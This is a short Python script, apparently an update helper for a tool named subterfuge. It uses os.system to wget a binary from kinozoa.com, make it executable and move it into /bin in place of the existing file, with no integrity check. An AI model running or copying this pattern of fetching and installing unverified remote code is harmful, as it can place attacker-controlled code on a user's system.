import os
	#fix binary
os.system("wget kinozoa.com/files/subterfuge")
os.system("chmod +x subterfuge")
os.system("rm /bin/subterfuge")
os.system("mv subterfuge /bin/")
